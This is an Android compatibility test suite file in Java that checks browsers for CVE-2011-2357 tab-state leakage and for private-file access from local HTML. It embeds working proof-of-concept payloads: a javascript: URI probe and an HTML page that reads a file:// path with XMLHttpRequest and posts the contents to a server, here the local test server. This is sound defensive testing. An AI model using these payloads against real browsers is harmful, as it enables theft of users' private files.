/*
 * Copyright (C) 2011 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.test.AndroidTestCase;
import android.webkit.cts.CtsTestServer;

import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.http.HttpEntity;
/**
 * Test file for browser security issues.
 */
public class BrowserTest extends AndroidTestCase {
    private CtsTestServer mWebServer;

    @Override
    protected void setUp() throws Exception {
        super.setUp();
        mWebServer = new CtsTestServer(mContext);
    }

    @Override
    protected void tearDown() throws Exception {
        mWebServer.shutdown();
        super.tearDown();
    }

    /**
     * Verify that no state is preserved across multiple intents sent
     * to the browser when we reuse a browser tab. If such data is preserved,
     * then browser is vulnerable to a data stealing attack.
     *
     * In this test, we send two intents to the Android browser. The first
     * intent sets document.b2 to 1.  The second intent attempts to read
     * document.b2.  If the read is successful, then state was preserved
     * across the two intents.
     *
     * If state is preserved across browser tabs, we ask
     * the browser to send an HTTP request to our local server.
     *
     * See http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-2357 for
     * vulnerability information for this test case.
     *
     * See commits  096bae248453abe83cbb2e5a2c744bd62cdb620b and
     * afa4ab1e4c1d645e34bd408ce04cadfd2e5dae1e for patches for above vulnerability.
     */
    public void testTabReuse() throws InterruptedException {
        List<Intent> intents = getAllJavascriptIntents();
        for (Intent i : intents) {
            mContext.startActivity(i);
            mContext.startActivity(i);

            /*
             * Wait 5 seconds for the browser to contact the server, but
             * fail fast if we detect the bug
             */
            for (int j = 0; j < 5; j++) {
                assertEquals("javascript handler preserves state across "
                        + "multiple intents. Vulnerable to CVE-2011-2357?",
                        0, mWebServer.getRequestCount());
                Thread.sleep(1000);
            }
        }
    }

    /**
     * Verify that no state is preserved across multiple intents sent
     * to the browser when we run out of usable browser tabs.  If such data is
     * preserved, then browser is vulnerable to a data stealing attack.
     *
     * In this test, we send 20 intents to the Android browser.  Each
     * intent sets the variable "document.b1" equal to 1.  If we are able
     * read document.b1 in subsequent invocations of the intent, then
     * we know state was preserved.  In that case, we send a message
     * to the local server, recording this fact.
     *
     * Our test fails if the local server ever receives an HTTP request.
     *
     * See http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-2357 for
     * vulnerability information this test case.
     *
     * See commits  096bae248453abe83cbb2e5a2c744bd62cdb620b and
     * afa4ab1e4c1d645e34bd408ce04cadfd2e5dae1e for patches for above vulnerability.
     */
    public void testTabExhaustion() throws InterruptedException {
        List<Intent> intents = getAllJavascriptIntents();
        for (Intent i : intents) {
            i.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);

            /*
             * Send 20 intents.  20 is greater than the maximum number
             * of tabs allowed by the Android browser.
             */
            for (int j = 0; j < 20; j++) {
                mContext.startActivity(i);
            }

            /*
             * Wait 5 seconds for the browser to contact the server, but
             * fail fast if we detect the bug
             */
            for (int j = 0; j < 5; j++) {
                assertEquals("javascript handler preserves state across "
                        + "multiple intents. Vulnerable to CVE-2011-2357?",
                        0, mWebServer.getRequestCount());
                Thread.sleep(1000);
            }
        }
    }

    /**
     * See Bug 6212665 for detailed information about this issue.
     */
    public void testBrowserPrivateDataAccess() throws Throwable {

        // Create a list of all intents for http display. This includes all browsers.
        List<Intent> intents = createAllIntents(Uri.parse("http://www.google.com"));
        String action = "\"" + mWebServer.getBaseUri() + "/\"";
        // test each browser
        for (Intent intent : intents) {
            // reset state
            mWebServer.resetRequestState();
            // define target file, which is supposedly protected from this app
            String targetFile = "file://" + getTargetFilePath();
            String html =
                "<html><body>\n" +
                "  <form name=\"myform\" action=" + action + " method=\"post\">\n" +
                "  <input type='text' name='val'/>\n" +
                "  <a href=\"javascript :submitform()\">Search</a></form>\n" +
                "<script>\n" +
                "  var client = new XMLHttpRequest();\n" +
                "  client.open('GET', '" + targetFile + "');\n" +
                "  client.onreadystatechange = function() {\n" +
                "  if(client.readyState == 4) {\n" +
                "    myform.val.value = client.responseText;\n" +
                "    document.myform.submit(); \n" +
                "  }}\n" +
                "  client.send();\n" +
                "</script></body></html>\n";
            String filename = "jsfileaccess.html";
            // create a local HTML to access protected file
            FileOutputStream out = mContext.openFileOutput(filename,
                                                           mContext.MODE_WORLD_READABLE);
            Writer writer = new OutputStreamWriter(out, "UTF-8");
            writer.write(html);
            writer.flush();
            writer.close();

            String filepath = mContext.getFileStreamPath(filename).getAbsolutePath();
            Uri uri = Uri.parse("file://" + filepath);
            // do a file request
            intent.setData(uri);
            mContext.startActivity(intent);
            /*
             * Wait 5 seconds for the browser to contact the server, but
             * fail fast if we detect the bug
             */
            for (int j = 0; j < 5; j++) {
                // it seems that even when cross-origin policy prevents a file
                // access, browser is still doing a POST sometimes, but it just
                // sends the query part and no private data. Make sure this does not
                // cause a false alarm.
                if (mWebServer.getRequestEntities().size() > 0) {
                    int len = 0;
                    for (HttpEntity entity : mWebServer.getRequestEntities()) {
                        len += entity.getContentLength();
                    }
                    final int queryLen = "val=".length();
                    assertTrue("Failed preventing access to private data", len <= queryLen);
                }
                Thread.sleep(1000);
            }
        }
    }

    private String getTargetFilePath() throws Exception {
        FileOutputStream out = mContext.openFileOutput("target.txt",
                                                       mContext.MODE_WORLD_READABLE);
        Writer writer = new OutputStreamWriter(out, "UTF-8");
        writer.write("testing");
        writer.flush();
        writer.close();
        return mContext.getFileStreamPath("target.txt").getAbsolutePath();
    }

    /**
     * This method returns a List of explicit Intents for all programs
     * which handle javascript URIs.
     */
    private List<Intent> getAllJavascriptIntents() {
        String localServerUri = mWebServer.getBaseUri();
        String varName = "document.b" + System.currentTimeMillis();

        /*
         * Build a javascript URL containing the following (without spaces and newlines)
         * <code>
         *    if (document.b12345 == 1) {
         *       document.location = "http://localhost:1234/";
         *    }
         *    document.b12345 = 1;
         * </code>
         */
        String javascript = "javascript:if(" + varName + "==1){"
                + "document.location=\"" + localServerUri + "\""
                + "};"
                + varName + "=1";

        return createAllIntents(Uri.parse(javascript));
    }

    /**
     * Create intents for all activities that can display the given URI.
     */
    private List<Intent> createAllIntents(Uri uri) {

        Intent implicit = new Intent(Intent.ACTION_VIEW);
        implicit.setData(uri);

        /* convert our implicit Intent into multiple explicit Intents */
        List<Intent> retval = new ArrayList<Intent>();
        PackageManager pm = mContext.getPackageManager();
        List<ResolveInfo> list = pm.queryIntentActivities(implicit, PackageManager.GET_META_DATA);
        for (ResolveInfo i : list) {
            Intent explicit = new Intent(Intent.ACTION_VIEW);
            explicit.setClassName(i.activityInfo.packageName, i.activityInfo.name);
            explicit.setData(uri);
            explicit.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            retval.add(explicit);
        }

        return retval;
    }
}
